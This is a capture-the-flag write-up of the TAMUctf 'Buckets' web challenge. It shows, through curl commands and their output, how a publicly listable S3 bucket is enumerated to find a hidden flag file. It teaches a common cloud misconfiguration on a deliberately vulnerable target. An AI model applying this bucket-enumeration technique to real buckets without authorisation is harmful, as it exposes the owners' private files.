# Buckets
Web, 362 points

## Description:

> Checkout my s3 bucket website!
> 
> http://tamuctf.s3-website-us-west-2.amazonaws.com/

## Solution:

The website itself didn't contain much:

```console
root@kali:/media/sf_CTFs/tamu/Buckets# curl http://tamuctf.s3-website-us-west-2.amazonaws.com/
<!DOCTYPE html>
<!--http://ctfdevbucket.s3-website.us-east-2.amazonaws.com/-->
<html>
<head>
<!--Wow my first AWS web page!
        I think I am finally figuring out S3 buckets,
        it is just really so easy to use!
        If you forget for your passwords it is near the Dogs..-->
<style>
#DIV {
        background-color: white;
        color: black;
        text-align: center;
}
</style>

<title>AWS Problem</title>
</head>
<body style="background-image:url(doggos3.jpg)">

<div id="DIV">
<h1>Dogs are definitely better than cats</h1>
</div>

<!--If you look around hard enough you might find some dogs, some cats, some animals and some mysteries-->

</body>
</html>
```

We have three comments that look like hints:

> http://ctfdevbucket.s3-website.us-east-2.amazonaws.com/

> If you forget for your passwords it is near the Dogs..

> If you look around hard enough you might find some dogs, some cats, some animals and some mysteries

The first comment didn't lead anywhere:

```console
root@kali:/media/sf_CTFs/tamu/Buckets# curl http://ctfdevbucket.s3-website.us-east-2.amazonaws.com/
<html>
<head><title>404 Not Found</title></head>
<body>
<h1>404 Not Found</h1>
<ul>
<li>Code: NoSuchBucket</li>
<li>Message: The specified bucket does not exist</li>
<li>BucketName: ctfdevbucket</li>
<li>RequestId: AF31018CB45DEACA</li>
<li>HostId: RzK7lXpl68GMX9TIGayRyS+UYRS5wV/zVxFQSYVyfJ+8iA8wEG/MVKFlHo6yhMF6r4/haS6C64Y=</li>
</ul>
<hr/>
</body>
</html>
```

From a quick search it turned out that there's a list of common mistakes related to S3 bucket configuration, and having the bucket's listing access permission set to "Everyone" is one of the most basic mistakes.

In order to attempt and read the bucket's listing, all we need to do is translate the address from `http://name.s3-website-us-west-2.amazonaws.com/` to `http://name.s3.amazonaws.com/`.

```console
root@kali:/media/sf_CTFs/tamu/Buckets# curl http://tamuctf.s3.amazonaws.com/
<?xml version="1.0" encoding="UTF-8"?>
<ListBucketResult xmlns="http://s3.amazonaws.com/doc/2006-03-01/"><Name>tamuctf</Name><Prefix></Prefix><Marker></Marker><MaxKeys>1000</MaxKeys><IsTruncated>false</IsTruncated><Contents><Key>Animals/animals.jpg</Key><LastModified>2019-02-19T17:06:50.000Z</LastModified><ETag>&quot;e2d52ec7d9b6b49967e059c9a828db4d&quot;</ETag><Size>63121</Size><StorageClass>STANDARD</StorageClass></Contents><Contents><Key>Animals/cute-zoo-animals_1191-143.jpg</Key><LastModified>2019-02-19T17:06:50.000Z</LastModified><ETag>&quot;7d28d0fc1ba83b0600e67dc3590a0bce&quot;</ETag><Size>44982</Size><StorageClass>STANDARD</StorageClass></Contents><Contents><Key>Animals/images.jpeg</Key><LastModified>2019-02-19T17:06:50.000Z</LastModified><ETag>&quot;3c61edb2ff6cd31ee8700f68a5a9a7d8&quot;</ETag><Size>12107</Size><StorageClass>STANDARD</StorageClass></Contents><Contents><Key>Cats/cat.jpeg</Key><LastModified>2019-02-19T17:06:50.000Z</LastModified><ETag>&quot;ff3756cce9ef479620ae2053f9da0555&quot;</ETag><Size>6828</Size><StorageClass>STANDARD</StorageClass></Contents><Contents><Key>Cats/cat.webp</Key><LastModified>2019-02-19T17:06:50.000Z</LastModified><ETag>&quot;78a653a6531843132475d5bbfbbb7bdb&quot;</ETag><Size>22810</Size><StorageClass>STANDARD</StorageClass></Contents><Contents><Key>Cats/cat3.jpeg</Key><LastModified>2019-02-19T17:06:50.000Z</LastModified><ETag>&quot;40201e7d71c0fbc00f25c98b93d4a564&quot;</ETag><Size>6407</Size><StorageClass>STANDARD</StorageClass></Contents><Contents><Key>Dogs/CC2B70BD238F48BE29D8F0D42B170127/CBD2DD691D3DB1EBF96B283BDC8FD9A1/flag.txt</Key><LastModified>2019-02-19T17:06:51.000Z</LastModified><ETag>&quot;0a2a337eda703cf59b4bc491dbc73621&quot;</ETag><Size>28</Size><StorageClass>STANDARD</StorageClass></Contents><Contents><Key>Dogs/beaglepup.jpeg</Key><LastModified>2019-02-19T17:06:49.000Z</LastModified><ETag>&quot;e09ad7406d6cf80ad6eceac51a1c28a6&quot;</ETag><Size>8120</Size><StorageClass>STANDARD</StorageClass></Contents><Contents><Key>Dogs/pup.html</Key><LastModified>2019-02-19T17:06:49.000Z</LastModified><ETag>&quot;fb7fcf173bb53130398a003678c3c36e&quot;</ETag><Size>919</Size><StorageClass>STANDARD</StorageClass></Contents><Contents><Key>Dogs/puphalloween.jpeg</Key><LastModified>2019-02-19T17:06:49.000Z</LastModified><ETag>&quot;fa2fd3d520ed31507338f4b8ab92bbcc&quot;</ETag><Size>6305</Size><StorageClass>STANDARD</StorageClass></Contents><Contents><Key>Dogs/pupnerd.jpeg</Key><LastModified>2019-02-19T17:06:49.000Z</LastModified><ETag>&quot;73071d66448d7308e1de23381532d945&quot;</ETag><Size>7666</Size><StorageClass>STANDARD</StorageClass></Contents><Contents><Key>Dogs/pupnerd2.webp</Key><LastModified>2019-02-19T17:06:49.000Z</LastModified><ETag>&quot;22d5ad1078d33279ebded659eebee1d2&quot;</ETag><Size>17666</Size><StorageClass>STANDARD</StorageClass></Contents><Contents><Key>Dogs/pups.jpg</Key><LastModified>2019-02-19T17:06:49.000Z</LastModified><ETag>&quot;533bf1604309fd9b3727fc2163e7e16b&quot;</ETag><Size>165653</Size><StorageClass>STANDARD</StorageClass></Contents><Contents><Key>doggos3.jpg</Key><LastModified>2019-02-19T17:06:49.000Z</LastModified><ETag>&quot;0e617b1f12ae2de23757305a4a4cf2b0&quot;</ETag><Size>124222</Size><StorageClass>STANDARD</StorageClass></Contents><Contents><Key>index.html</Key><LastModified>2019-02-19T17:06:49.000Z</LastModified><ETag>&quot;cd654a6ed564b4546a886d13ecad17af&quot;</ETag><Size>632</Size><StorageClass>STANDARD</StorageClass></Contents></ListBucketResult>
```

Like the hint said, the password is near the dogs:
```console
root@kali:/media/sf_CTFs/tamu/Buckets# curl http://tamuctf.s3-website-us-west-2.amazonaws.com/Dogs/CC2B70BD238F48BE29D8F0D42B170127/CBD2DD691D3DB1EBF96B283BDC8FD9A1/flag.txt
flag{W0W_S3_BAD_PERMISSIONS}
```

